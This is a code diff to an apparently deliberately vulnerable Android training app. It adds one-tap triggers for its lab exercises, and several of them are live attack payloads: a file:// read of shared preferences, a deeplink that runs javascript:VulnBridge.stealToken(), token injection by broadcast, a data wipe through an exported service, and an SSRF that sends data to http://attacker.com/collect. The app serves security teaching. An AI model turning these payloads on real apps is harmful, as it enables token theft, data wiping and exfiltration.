@@ -1,5 +1,10 @@
 package com.gu3sswe4k.app.models;
 
+import android.content.ComponentName;
+import android.content.Intent;
+import android.net.Uri;
+import android.widget.Toast;
+
 import java.util.ArrayList;
 import java.util.List;
 
@@ -14,14 +19,22 @@ public class LabRepository {
         // WebView
         labs.add(new LabItem("WV-01", "JS enabled, no origin check", "WebView", CRITICAL, WebViewActivity.class));
         labs.add(new LabItem("WV-02", "JavascriptInterface bridge exposed", "WebView", CRITICAL, WebViewActivity.class));
-        labs.add(new LabItem("WV-03", "Local file read via file://", "WebView", CRITICAL, WebViewActivity.class));
+        labs.add(new LabItem("WV-03", "Local file read via file://", "WebView", CRITICAL, null, activity -> {
+            Intent i = new Intent(activity, WebViewActivity.class);
+            i.putExtra("url", "file:///data/data/com.gu3sswe4k.app/shared_prefs/user_prefs.xml");
+            activity.startActivity(i);
+        }));
         labs.add(new LabItem("WV-04", "Arbitrary URL from Intent", "WebView", CRITICAL, WebViewActivity.class));
         labs.add(new LabItem("WV-05", "Deeplink loads file:// / javascript:", "WebView", CRITICAL, WebViewActivity.class));
 
         // Deeplink
         labs.add(new LabItem("DL-01/02", "Deeplink hijack", "Deeplink", HIGH, DeeplinkActivity.class));
         labs.add(new LabItem("DL-03", "Token overwrite via deeplink", "Deeplink", HIGH, DeeplinkActivity.class));
-        labs.add(new LabItem("DL-CHAIN", "Deeplink to WebView RCE chain", "Deeplink", HIGH, DeeplinkActivity.class));
+        labs.add(new LabItem("DL-CHAIN", "Deeplink to WebView RCE chain", "Deeplink", HIGH, null, activity -> {
+            Intent i = new Intent(Intent.ACTION_VIEW);
+            i.setData(Uri.parse("vulndroid://settings?redirect=com.gu3sswe4k.app.activities.WebViewActivity&url=javascript:VulnBridge.stealToken()"));
+            activity.startActivity(i);
+        }));
 
         // Auth / SQLi
         labs.add(new LabItem("SQL-01", "Login SQL injection bypass", "Auth / SQL Injection", CRITICAL, LoginActivity.class));
@@ -37,12 +50,32 @@ public class LabRepository {
         labs.add(new LabItem("BOLA-01", "Broken object level authorization via user id", "API / Authorization", CRITICAL, BolaLabActivity.class));
 
         // Broadcast Receiver
-        labs.add(new LabItem("BR-01/02", "Token injection via broadcast", "Broadcast Receiver", MEDIUM, null));
+        labs.add(new LabItem("BR-01/02", "Token injection via broadcast", "Broadcast Receiver", MEDIUM, null, activity -> {
+            Intent b = new Intent("com.gu3sswe4k.app.SEND_TOKEN");
+            b.setPackage(activity.getPackageName());
+            b.putExtra("token", "INJECTED_" + System.currentTimeMillis());
+            b.putExtra("user", "attacker");
+            activity.sendBroadcast(b);
+            Toast.makeText(activity, "Broadcast sent! Check logcat.", Toast.LENGTH_SHORT).show();
+        }));
         labs.add(new LabItem("BR-03", "Sensitive data in logcat", "Broadcast Receiver", MEDIUM, LogcatLeakActivity.class));
 
         // Service
-        labs.add(new LabItem("SV-02A", "Data wipe via exported service", "Service", HIGH, null));
-        labs.add(new LabItem("SV-02B", "Data exfil SSRF via service", "Service", HIGH, null));
+        labs.add(new LabItem("SV-02A", "Data wipe via exported service", "Service", HIGH, null, activity -> {
+            Intent s = new Intent();
+            s.setComponent(new ComponentName(activity, "com.gu3sswe4k.app.services.DataSyncService"));
+            s.putExtra("action", "wipe_user_data");
+            activity.startService(s);
+            Toast.makeText(activity, "Wipe triggered!", Toast.LENGTH_SHORT).show();
+        }));
+        labs.add(new LabItem("SV-02B", "Data exfil SSRF via service", "Service", HIGH, null, activity -> {
+            Intent s = new Intent();
+            s.setComponent(new ComponentName(activity, "com.gu3sswe4k.app.services.DataSyncService"));
+            s.putExtra("action", "sync");
+            s.putExtra("endpoint", "http://attacker.com/collect");
+            activity.startService(s);
+            Toast.makeText(activity, "Exfil triggered!", Toast.LENGTH_SHORT).show();
+        }));
 
         // Network
         labs.add(new LabItem("NET-01", "Cleartext traffic, no cert pinning", "Network Interception", MEDIUM, NetworkLabActivity.class));
